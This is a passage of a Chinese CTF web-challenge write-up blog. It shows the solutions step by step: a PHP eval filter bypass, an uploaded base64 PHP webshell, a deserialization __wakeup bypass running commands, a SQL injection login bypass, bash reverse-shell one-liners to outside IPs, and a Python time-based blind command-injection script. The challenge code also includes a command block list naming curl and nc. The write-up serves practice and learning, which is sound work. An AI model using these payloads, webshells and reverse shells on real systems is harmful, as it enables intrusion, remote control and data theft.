class="string">&#x27;\&#x27;;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./?flag=&#x27;</span>.<span class="variable">$exam</span>.<span class="string">&#x27;&quot;&gt;Click here&lt;/a&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) != strlen(<span class="variable">$exam</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;长度不允许&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/`|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;关键字不允许&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) === sha1(<span class="variable">$flag</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;马老师发生甚么事了&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>s 模式中的圆点元字符（.）匹配所有的字符，包括换行符</p>
<p>\ \ \ \ |经过测试拦截了“,\ \” 这两个都要拦截，不只是“\ \”</p>
<p> 下面存在eval()函数，我们可以通过构造php代码来绕过</p>
<h5 id="和是短标签而是长标签，"><a href="#和是短标签而是长标签，" class="headerlink" title="和是短标签而是长标签，"></a><? ?>和<?= ?>是短标签而<?php ?>是长标签，</h5><h5 id="其中"><a href="#其中" class="headerlink" title="其中"></a>其中<?= 是代替 <? echo的，<? ?> 代替的是<?php ?></h5><p>按照这样来构造<?=$flag;?>，flag被过滤了,用$a构造一个flag字符串,然后echo$$a,[]也被过滤了<br>然后构造得</p>
<p>/?flag=$a=’fla9’;$a{3}=’g’;?&gt;<?=$$a;?>111111111111111111</p>
<p>##用’’是因为””被过滤了<br>从flag=后面开始数，长度刚好要等于49,111~就是为了凑<br>flag被过滤了，所以fla9，再把9用g替换<br>弄完一个记得分号;<br>eval($a=’fla9’;$a{3}=’g’;?&gt;<?=$$a;?>111111111111111111)</p>
<p>或者</p>
<p>首先要介绍的是php短标签风格：</p>
<p><strong>①开启短标签风格后，能够正常解析 phpinfo(); ?&gt;这样的代码</strong></p>
<p><strong>②可以使用<?=$a?>进行输出。举个例子：&lt;php? echo ‘hello’; ?&gt; 等价于 <?='hello';?></strong></p>
<p>其次，flag被过滤了，可用先赋其他值，再修改的方法绕过</p>
<p>由于[]也被过滤掉了，我们需要用{}来代替其作用。最后，还要保证的一点就是长度，若长度不够，可以在中间插入无关的字符</p>
<p>payload = <strong>?flag=$a=’flxg’;$a{2}=’a’;11111111111111111;?&gt;<?=$$a;?>，因为短标签格式是可以识别phpinfo() ?&gt;等类似只有?&gt;形式的代码，所以payload前半段不需要加上&lt;?</strong></p>
<h4 id="xxx二手交易市场"><a href="#xxx二手交易市场" class="headerlink" title="xxx二手交易市场"></a>xxx二手交易市场</h4><h5 id="1-随便注册一个账号，随便翻一下页面，发现有一个头像上传，bs抓包。"><a href="#1-随便注册一个账号，随便翻一下页面，发现有一个头像上传，bs抓包。" class="headerlink" title="1.随便注册一个账号，随便翻一下页面，发现有一个头像上传，bs抓包。"></a>1.随便注册一个账号，随便翻一下页面，发现有一个头像上传，bs抓包。</h5><p>发现有照片数据，将其改为php文件，并修改数据即下面这样。</p>
<p>image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydzeWMnXSk7Pz4=</p>
<p>2.蚁剑连接，密码syc，连接成功，最终在html目录内发现flag。</p>
<h4 id="安慰奖"><a href="#安慰奖" class="headerlink" title="安慰奖"></a>安慰奖</h4><p>c查看源代码，发现backup，访问index.php.bak获得源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$a</span> = `<span class="keyword">$this</span>-&gt;cmd`;</span><br><span class="line">            var_dump(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$a</span> = `<span class="keyword">$this</span>-&gt;cmd`;</span><br><span class="line">            var_dump(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$select</span> = <span class="keyword">new</span> ctf(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;tac flag.php&quot;</span>);</span><br><span class="line">    <span class="variable">$res</span>=serialize(<span class="variable">$select</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>__wakeup函数当对象数量的值大于真实的就会绕过该函数。 2. 被修饰为protected和private的属性序列化后会变成%00*%00属性名，而%00不可见、 3. cat的替代函数为tac</li>
</ol>
<p>O:3:”ctf”:2:{s:11:”*username”;s:5:”admin”;s:6:”*cmd”;s:2:”ls”;} </p>
<p>O:3:”ctf”:3:{s:11:”*username”;s:5:”admin”;s:6:”*cmd”;s:2:”ls”;} </p>
<p>在使用</p>
<p>O:3:”ctf”:3:{s:11:” =%00 * %00username”;s:5:”admin”;s:6:”%00 * %00cmd”;s:12:”tac flag.php”;} </p>
<p>即可得到flag</p>
<h4 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a>decrypt</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = md5(<span class="string">&#x27;ISCC&#x27;</span>);  <span class="comment">//729623334f0aa2784a1599fd374c120d 用php函数md5加密</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$len</span> = strlen(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$klen</span> = strlen(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>) <span class="comment">//32</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span> .= chr((ord(<span class="variable">$data</span>[<span class="variable">$i</span>]) + ord(<span class="variable">$char</span>[<span class="variable">$i</span>])) % <span class="number">128</span>); <span class="comment">//主要的加密逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python代码</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    text1=base64.b64decode(<span class="built_in">str</span>)</span><br><span class="line">    b = text1.decode()  //将<span class="built_in">bytes</span>转为字符串</span><br><span class="line">    key=<span class="string">&#x27;729623334f0aa2784a1599fd374c120d729623&#x27;</span></span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">       flag +=<span class="built_in">chr</span>((<span class="built_in">ord</span>(b[i])-<span class="built_in">ord</span>(key[i]))%<span class="number">128</span>)</span><br><span class="line">       <span class="comment">#flag +=chr((text1[i]-ord(key[i])+128)%128)   //python3把上一句注释掉用这一句，这是个python2脚本</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">str</span>=<span class="string">&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;</span></span><br><span class="line">    decrypt(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>

<p>Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}</p>
<h4 id="login2"><a href="#login2" class="headerlink" title="login2"></a>login2</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username,password FROM admin WHERE username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$row</span>) &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]===md5(<span class="variable">$password</span>))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload为username=admin’ union select 1,md5(123)#&amp;password=123 </p>
<p>“admin’ union select 1,md5(123)#”</p>
<p>这里可以看到它是分离式的验证，首先查询username的用户，然后拿出password再进行比较，一开始想着是注入出admin的密码，但发现可能没有这个用户，而且也找不到注入的poc。后来参考网上的writeup才知道正确的打开方式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; union select 1,md5(1)#&amp;password=1</span><br></pre></td></tr></table></figure>

<p>执行这条语句时由于前面的username为空，所以没有数据返回，但后面的union select md5(1),md5(1)则会返回两个MD5(1)的值，然后password我们也置为1，从而绕过if语句的判断。</p>
<p>还原语句为：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM admin WHERE username=<span class="string">&#x27;a&#x27;</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span></span> <span class="number">1</span>,md5(<span class="number">1</span>)-- -&amp;password=<span class="number">1</span>&#x27;</span><br></pre></td></tr></table></figure>

<p>此时我们可以 username=’’， 两个 sql 语句进行联合操作时，当前一个语句选择的内容为空， 我们这里就将后面的语句的内容显示出来</p>
<p>image.png</p>
<p>所以本题中的SELECT username,password FROM admin WHERE username=’a’ union select 1,md5(1)– 将会返回</p>
<table>
<thead>
<tr>
<th>username</th>
<th>password</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>md5(1)</td>
</tr>
</tbody></table>
<p>这样就能使if判断为真<br> if (!empty($row) &amp;&amp; $row[‘password’]===md5($password))</p>
<h6 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h6><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="number">123</span> ; bash -i &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/185.199.111.153/</span><span class="number">6666</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>bash -i &gt;&amp; /dev/tcp/192.168.221.128/8888 0&gt;&amp;1</p>
<h6 id="第二种方法-利用sleep函数"><a href="#第二种方法-利用sleep函数" class="headerlink" title="第二种方法 利用sleep函数"></a>第二种方法 利用sleep函数</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://123.206.31.85:49165/login.php&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="comment"># keep session_id</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;impossible\&#x27; union select 1,\&#x27;76a2173be6393254e72ffa4d6df1030a\&#x27;#&#x27;</span>, <span class="string">&#x27;password&#x27;</span> : <span class="string">&#x27;passwd&#x27;</span>&#125;</span><br><span class="line">s.post(url, data = data, headers = headers)</span><br><span class="line"><span class="comment"># sign in first</span></span><br><span class="line">url = <span class="string">&#x27;http://123.206.31.85:49165/index.php&#x27;</span></span><br><span class="line"><span class="built_in">len</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	payload = <span class="string">&#x27;nothing;str=`ls`;if [ $&#123;#str&#125; -eq &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>) + <span class="string">&#x27; ] ;then sleep 4;fi&#x27;</span></span><br><span class="line">	data = &#123;<span class="string">&#x27;c&#x27;</span> : payload&#125;</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		s.post(url, data = data, headers = headers, timeout = <span class="number">3</span>)</span><br><span class="line">	<span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="built_in">len</span> += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Length of `ls`:&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">ls = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">	<span class="keyword">for</span> <span class="built_in">dict</span> <span class="keyword">in</span> <span class="string">&quot; abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:\&#x27;\&quot;|\,&lt;.&gt;/?&quot;</span>:</span><br><span class="line">		payload = <span class="string">&#x27;nothing;str=`ls`;if [ $&#123;str:&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;:1&#125; == \&#x27;&#x27;</span> + <span class="built_in">dict</span> + <span class="string">&#x27;\&#x27; ] ;then sleep 4;fi&#x27;</span></span><br><span class="line">		<span class="comment">#print(payload)</span></span><br><span class="line">		data = &#123;<span class="string">&#x27;c&#x27;</span> : payload&#125;</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			s.post(url, data = data, headers = headers, timeout = <span class="number">3</span>)</span><br><span class="line">		<span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">			ls += <span class="built_in">dict</span></span><br><span class="line">			<span class="built_in">print</span>(<span class="built_in">dict</span>)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">dict</span> == <span class="string">&#x27;?&#x27;</span>):</span><br><span class="line">			ls += <span class="string">&#x27; &#x27;</span></span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;`ls`:&#x27;</span> + ls)</span><br><span class="line">//可以爆破出目录</span><br></pre></td></tr></table></figure>

<h5 id="网上看到的最终方法（网页是没有回显的）"><a href="#网上看到的最终方法（网页是没有回显的）" class="headerlink" title="网上看到的最终方法（网页是没有回显的）"></a>网上看到的最终方法（网页是没有回显的）</h5><h5 id="采用写入文件二次返回的方法查看结果"><a href="#采用写入文件二次返回的方法查看结果" class="headerlink" title="采用写入文件二次返回的方法查看结果"></a>采用写入文件二次返回的方法查看结果</h5><h5 id="123-ls-gt-test"><a href="#123-ls-gt-test" class="headerlink" title="123|ls ../../../&gt;test"></a>123|ls ../../../&gt;test</h5><h5 id="访问http-114-67-246-176-11727-test"><a href="#访问http-114-67-246-176-11727-test" class="headerlink" title="访问http://114.67.246.176:11727/test"></a>访问<a target="_blank" rel="noopener" href="http://114.67.246.176:11727/test">http://114.67.246.176:11727/test</a></h5><h5 id="123-cat-flag-gt-test"><a href="#123-cat-flag-gt-test" class="headerlink" title="123|cat /flag&gt;test"></a>123|cat /flag&gt;test</h5><h5 id="再访问http-114-67-246-176-11727-test"><a href="#再访问http-114-67-246-176-11727-test" class="headerlink" title="再访问http://114.67.246.176:11727/test"></a>再访问<a target="_blank" rel="noopener" href="http://114.67.246.176:11727/test">http://114.67.246.176:11727/test</a></h5><p>通过这种方法可以得到当前目录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">css</span><br><span class="line">index.php</span><br><span class="line">login.php</span><br><span class="line">test</span><br></pre></td></tr></table></figure>

<p>上一层目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cgi-bin</span><br><span class="line">error</span><br><span class="line">html</span><br><span class="line">icons</span><br></pre></td></tr></table></figure>

<p>上上一层目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cache</span><br><span class="line">db</span><br><span class="line">empty</span><br><span class="line">games</span><br><span class="line">lib</span><br><span class="line">local</span><br><span class="line">lock</span><br><span class="line">log</span><br><span class="line">mail</span><br><span class="line">nis</span><br><span class="line">opt</span><br><span class="line">preserve</span><br><span class="line">run</span><br><span class="line">spool</span><br><span class="line">tmp</span><br><span class="line">www</span><br><span class="line">yp</span><br></pre></td></tr></table></figure>

<p>再上一层</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">sbin</span><br><span class="line">selinux</span><br><span class="line">srv</span><br><span class="line">supervisord.log</span><br><span class="line">supervisord.pid</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>

